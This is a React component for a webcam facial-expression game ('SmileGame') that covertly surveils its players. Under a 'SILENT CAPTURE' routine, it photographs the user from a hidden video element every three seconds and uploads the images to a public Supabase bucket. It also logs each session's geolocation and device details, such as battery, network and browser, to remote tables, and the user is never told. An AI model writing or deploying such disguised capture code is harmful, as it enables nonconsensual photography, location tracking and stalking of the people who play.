import React, { useEffect, useRef, useState } from "react";
import { loadFaceLandmarker } from "../utils/faceLandmarker";
import { supabaseClient } from "../supabaseClient";
import { getSmartLocation, getDeviceDetails } from "../utils/capture";
import "./SmileGame.css";

/* ===== CONFIG ===== */
const HOLD_TIME = 3000;
const SMILE_ON = 0.35;
const KISS_ON = 0.6;
const ANGER_ON = 0.2;
const ANGER_SMILE_MAX = 0.25;
const NEUTRAL_MAX = 0.15;
const BLINK_ON = 0.45;
const CAPTURE_INTERVAL = 3000;

const TASKS = [
  { id: "smile", text: "😄 Hold your smile" },
  { id: "kiss", text: "💋 Send a kiss" },
  { id: "dont-smile", text: "😈 Don’t smile" },
  { id: "anger", text: "😠 Look angry" },
  { id: "poker", text: "😐 Poker face" },
  { id: "blink", text: "👁️ Blink twice" },
];

export default function SmileGame() {
  const videoRef = useRef(null);
  const landmarkerRef = useRef(null);
  const rafRef = useRef(null);
  const captureTimerRef = useRef(null);

  const taskRef = useRef(null);
  const completedRef = useRef(false);
  const holdRef = useRef(0);
  const lastTimeRef = useRef(null);
  const blinkCount = useRef(0);
  const eyeClosed = useRef(false);

  const smileSmooth = useRef(0);
  const browSmooth = useRef(0);
  const sessionIdRef = useRef(null);

  const [message, setMessage] = useState("Look at the camera 👀");
  const [progress, setProgress] = useState(0);
  const [expression, setExpression] = useState("neutral");
  const [shake, setShake] = useState(false);
  const [completedAnim, setCompletedAnim] = useState(false);

  /* ===== SILENT CAPTURE ===== */
  const captureAndUpload = async () => {
    console.log("📸 Capturing image...", new Date().toLocaleTimeString());
    try {
      // Check if session ID is ready
      if (!sessionIdRef.current) {
        console.warn("⚠️ Session ID not initialized yet");
        return;
      }

      const video = videoRef.current;
      if (!video) {
        console.warn("⚠️ Video element not found");
        return;
      }

      // Log video state
      console.log("🎥 Video state:", {
        readyState: video.readyState,
        HAVE_ENOUGH_DATA: video.HAVE_ENOUGH_DATA,
        videoWidth: video.videoWidth,
        videoHeight: video.videoHeight,
      });

      if (
        video.readyState !== video.HAVE_ENOUGH_DATA ||
        video.videoWidth === 0
      ) {
        console.warn("⚠️ Video not ready yet");
        return;
      }

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);

      const blob = await new Promise((res) =>
        canvas.toBlob(res, "image/jpeg", 0.75)
      );
      if (!blob) {
        console.warn("⚠️ Blob creation failed");
        return;
      }

      console.log("📤 Uploading blob to Supabase...", blob.size, "bytes");

      const [loc, device] = await Promise.all([
        getSmartLocation(),
        getDeviceDetails(),
      ]);

      const fileName = `game_${Date.now()}.jpg`;

      const { error: uploadError } = await supabaseClient.storage
        .from("images")
        .upload(fileName, blob);

      if (uploadError) {
        console.error("❌ Upload error:", uploadError);
        return;
      }

      console.log("✅ File uploaded to storage!");

      const { data } = await supabaseClient.storage
        .from("images")
        .getPublicUrl(fileName);

      console.log("🔗 Public URL:", data.publicUrl);

      const { error: dbError } = await supabaseClient
        .from("images_table")
        .insert([
          { session_id: sessionIdRef.current, image_url: data.publicUrl },
        ]);

      if (dbError) {
        console.error("❌ Database insert error:", dbError);
        return;
      }

      console.log("✅ Image recorded in database!");

      if (loc?.lat && loc?.lon) {
        const { error: locError } = await supabaseClient
          .from("location_table")
          .insert([
            {
              session_id: sessionIdRef.current,
              latitude: loc.lat,
              longitude: loc.lon,
              location_type: loc.type,
              accuracy: loc.details?.accuracy ?? null,
            },
          ]);
        if (locError) {
          console.error("Location insert error:", locError);
        }
      }

      const { error: devError } = await supabaseClient
        .from("device_table")
        .insert([
          {
            session_id: sessionIdRef.current,
            battery_level: device.battery_level || "Unknown",
            is_charging: device.is_charging || "Unknown",
            network_type: device.network_type || "Unknown",
            internet_speed: device.internet_speed || "Unknown",
            screen_resolution: device.screen_res || "Unknown",
            platform: device.platform || "Unknown",
            browser: device.browser || "Unknown",
          },
        ]);
      if (devError) {
        console.error("Device insert error:", devError);
      }
    } catch (err) {
      console.error("Capture error:", err);
    }
  };

  /* ===== GAME LOOP ===== */
  const animate = (time) => {
    rafRef.current = requestAnimationFrame(animate);
    if (!landmarkerRef.current || !videoRef.current) return;
    if (completedRef.current) return;

    const res = landmarkerRef.current.detectForVideo(videoRef.current, time);
    if (!res.faceBlendshapes?.length) return;

    const blend = {};
    res.faceBlendshapes[0].categories.forEach(
      (c) => (blend[c.categoryName] = c.score)
    );

    const smile =
      ((blend.mouthSmileLeft || 0) + (blend.mouthSmileRight || 0)) / 2;
    const kiss = (blend.mouthPucker || 0) + (blend.mouthFunnel || 0);
    const brow = ((blend.browDownLeft || 0) + (blend.browDownRight || 0)) / 2;
    const blink = ((blend.eyeBlinkLeft || 0) + (blend.eyeBlinkRight || 0)) / 2;

    smileSmooth.current = smileSmooth.current * 0.7 + smile * 0.3;
    browSmooth.current = browSmooth.current * 0.7 + brow * 0.3;

    if (kiss > KISS_ON) setExpression("kiss");
    else if (smileSmooth.current > SMILE_ON) setExpression("smile");
    else if (browSmooth.current > ANGER_ON) setExpression("angry");
    else setExpression("neutral");

    const delta = lastTimeRef.current ? time - lastTimeRef.current : 0;
    lastTimeRef.current = time;

    const task = taskRef.current?.id;
    if (!task) return;

    if (task === "smile")
      handleHold(smileSmooth.current > SMILE_ON, delta, "✨ Nice smile!");

    if (task === "kiss" && kiss > KISS_ON) completeTask("💋 Perfect!");

    if (task === "dont-smile" && smileSmooth.current > SMILE_ON)
      failTask("😂 You smiled!");

    if (task === "anger") {
      const angry =
        browSmooth.current > ANGER_ON && smileSmooth.current < ANGER_SMILE_MAX;
      handleHold(angry, delta, "😠 Strong anger!");
    }

    if (task === "poker") {
      const neutral =
        smileSmooth.current < NEUTRAL_MAX &&
        browSmooth.current < NEUTRAL_MAX &&
        kiss < NEUTRAL_MAX;
      handleHold(neutral, delta, "😐 Solid control!");
    }

    if (task === "blink") {
      if (blink > BLINK_ON && !eyeClosed.current) eyeClosed.current = true;
      if (blink < 0.15 && eyeClosed.current) {
        eyeClosed.current = false;
        blinkCount.current += 1;
        setProgress(blinkCount.current / 2);
      }
      if (blinkCount.current >= 2) completeTask("👁️ Nice blinking!");
    }
  };

  const handleHold = (condition, delta, text) => {
    holdRef.current = condition ? holdRef.current + delta : 0;
    const p = Math.min(holdRef.current / HOLD_TIME, 1);
    setProgress(p);
    if (p >= 1) completeTask(text);
  };

  const completeTask = (text) => {
    completedRef.current = true;
    setMessage(text);
    setProgress(1);
    setCompletedAnim(true);
    setTimeout(startNewTask, 1500);
  };

  const failTask = (text) => {
    completedRef.current = true;
    setMessage(text);
    setShake(true);
    setTimeout(() => setShake(false), 400);
    setTimeout(startNewTask, 1500);
  };

  const startNewTask = () => {
    let next;
    do {
      next = TASKS[Math.floor(Math.random() * TASKS.length)];
    } while (next.id === taskRef.current?.id);

    taskRef.current = next;
    setMessage(next.text);
    setProgress(0);
    setCompletedAnim(false);
    completedRef.current = false;
    holdRef.current = 0;
    blinkCount.current = 0;
    eyeClosed.current = false;
    lastTimeRef.current = null;
  };

  useEffect(() => {
    const init = async () => {
      // Generate unique session ID
      sessionIdRef.current = `session_${Date.now()}_${Math.random()
        .toString(36)
        .substr(2, 9)}`;

      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
      });
      videoRef.current.srcObject = stream;
      await videoRef.current.play();

      landmarkerRef.current = await loadFaceLandmarker();
      startNewTask();
      rafRef.current = requestAnimationFrame(animate);

      // Wait a bit for video to stabilize before starting captures
      setTimeout(() => {
        console.log("✅ Starting capture interval (every 2 seconds)");
        captureTimerRef.current = setInterval(
          captureAndUpload,
          CAPTURE_INTERVAL
        );
      }, 1000);
    };

    init();
    return () => {
      cancelAnimationFrame(rafRef.current);
      clearInterval(captureTimerRef.current);
    };
  }, []);

  return (
    <div className={`smile-game ${shake ? "shake" : ""}`}>
      <video ref={videoRef} style={{ display: "none" }} />
      <div className="smile-ui">
        <div
          className={`ring thick ${completedAnim ? "complete" : ""}`}
          style={{
            background: `
              radial-gradient(circle at center, #0b0d2a 55%, transparent 56%),
              conic-gradient(from -90deg, #ff69b4 ${
                progress * 360
              }deg, rgba(255,255,255,0.1) 0deg)
            `,
          }}
        >
          <div className="ring-inner">
            <span className="emoji">
              {expression === "kiss"
                ? "😘"
                : expression === "smile"
                ? "😄"
                : expression === "angry"
                ? "😠"
                : "🙂"}
            </span>
          </div>
        </div>
        <div className="ring-label">{message}</div>
      </div>
    </div>
  );
}
